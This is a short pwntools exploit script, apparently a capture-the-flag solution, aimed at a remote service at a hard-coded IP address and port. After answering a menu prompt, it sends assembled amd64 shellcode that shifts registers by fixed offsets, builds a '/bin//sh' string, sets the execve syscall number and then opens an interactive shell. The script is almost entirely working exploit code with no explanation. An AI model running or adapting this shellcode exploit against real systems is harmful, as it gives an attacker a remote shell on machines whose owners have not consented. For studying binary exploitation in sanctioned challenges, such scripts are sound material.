#!/usr/bin/python3

from pwn import *

host = '172.210.129.230'
port = 1351
context.update(terminal=['tmux', 'new-window'], os='linux', arch='amd64')
connection = remote(host, port)

connection.recvuntil(b">> ")
connection.sendline(b"100")
connection.recvuntil(b">> ")

shellcode = """
sub r10, 0x193fe0
mov rsp, r10
add r10, 0x288f8
add rsp, 0x1e5000

xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
call r10
"""

assembled_shellcode = asm(shellcode)
connection.sendline(assembled_shellcode)
connection.interactive()